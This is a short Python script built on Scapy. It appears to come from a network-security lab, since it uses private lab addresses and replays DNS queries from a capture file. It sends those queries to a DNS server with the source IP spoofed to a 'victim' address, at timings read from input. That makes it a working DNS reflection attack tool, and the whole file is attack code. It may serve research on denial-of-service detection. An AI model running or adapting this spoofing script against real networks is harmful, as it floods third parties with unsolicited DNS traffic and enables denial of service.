import argparse
import sys
import socket
import random
import time
import struct

from scapy.all import *


def get_if():
    ifs = get_if_list()
    iface = None 
    for i in get_if_list():
        if "eth0" in i:
            iface = i
            break;
    if not iface:
        print('Cannot find eth0 interface')
        exit(1)
    return iface


def main():
    
    addr = "10.0.3.3"
    vic_addr = "10.0.1.1"
    if len(sys.argv) > 0:
        vic_addr = sys.argv[1]
    
    iface = get_if()
    print("iface: ", iface)

    pcap = rdpcap("dns0313_2_onlyDNS.pcapng")

    q_pkt = []
    for pkt in pcap:
        if pkt.qr == 0: # the packet is query
            q_pkt.append(pkt)

    try:
        socket = conf.L2socket(iface=iface) 
        N = int(raw_input())
        for i in range(0, N):
            a = float(raw_input())
            b = int(raw_input())
            pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
            pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[b].getlayer(DNS)
            sendp(pkt, iface = iface, verbose=False, socket=socket)
            if i%10 == 1:
                print("Send %4dst packet, id: %5d"%(i,pkt.getlayer(DNS).id))
            elif i%10 == 2:
                print("Send %4dnd packet, id: %5d"%(i,pkt.getlayer(DNS).id))
            elif i%10 == 3:
                print("Send %4drd packet, id: %5d"%(i,pkt.getlayer(DNS).id))
            else:
                print("Send %4dth packet, id: %5d"%(i,pkt.getlayer(DNS).id))
            
            time.sleep(a)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == '__main__':
    main()
    
